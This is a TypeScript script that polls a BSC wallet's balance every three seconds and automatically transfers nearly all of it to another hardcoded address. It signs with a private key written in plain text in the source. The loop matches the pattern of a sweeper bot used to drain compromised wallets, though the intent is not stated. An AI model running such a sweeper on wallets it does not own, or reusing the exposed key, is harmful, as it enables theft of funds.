#!/usr/bin/env node

import { program } from "commander";

import { networks } from "./networks";
import Web3 from "web3";
import delay from "delay";
var EthereumTx = require('ethereumjs-tx');

async function defaultGasLimit() {
  return '3000000';
}

function private2Account(web3: Web3, privateKey: string) {
  return web3.eth.accounts.privateKeyToAccount(privateKey).address;
}

async function defaultGasPrice(web3: Web3) {
  return Web3.utils.toHex(await web3.eth.getGasPrice());
}

async function txnonce(web3: Web3, pubkey: string) {
  return await web3.eth.getTransactionCount(pubkey);
}

async function main()  {
  //  获取nonce,使用本地私钥发送交易
  const pk = '0xced24e91fa4531456b60f9fc01b8041aef9c537cb7f813a0b9ef2f5e81e03fef';
  try {
    const web3 = new Web3(new Web3.providers.HttpProvider(networks['bsc']));
    const pubkey = private2Account(web3, pk)
    const gasPrice = await defaultGasPrice(web3);
    const chainId = await web3.eth.net.getId();
    const gasLimit = Web3.utils.toHex(await defaultGasLimit());

    while(true) {
    let balance = await web3.eth.getBalance('0x2B6b9a0981aE5b791eF8EEd84Cd8b20BE365E195');
    console.log('balance: ', balance.toString());

    if (balance.toString() !== '0') {
      const a = parseInt(balance) - 21000000000000;
      const nonce = await txnonce(web3, pubkey);
      const value = web3.utils.toHex(web3.utils.toWei(`${a}`, 'wei'));

      const txParams: any = {
        from: pubkey,
        to: '0x5A40Ac7dafceCbFAe05D28a85A34b1d131ECB743',
        chainId,
        nonce: Web3.utils.toHex(nonce),
        gasPrice,
        gasLimit,
        // 调用合约转账value这里留空
        value,
      };
      const etx = new EthereumTx(txParams);
      // 引入私钥，并转换为16进制
      const privateKeyHex = Buffer.from(pk.replace(/^0x/, ''), 'hex');
      // 用私钥签署交易
      etx.sign(privateKeyHex);
      // // 序列化
      const serializedTx = etx.serialize();
      const signedTxHex = `0x${serializedTx.toString('hex')}`;

      const receipt = await web3.eth.sendSignedTransaction(signedTxHex);

    }
    await delay(3 * 1000);
    }
  } catch (e: any) {
    throw new Error(e.message);
  }
}

main();


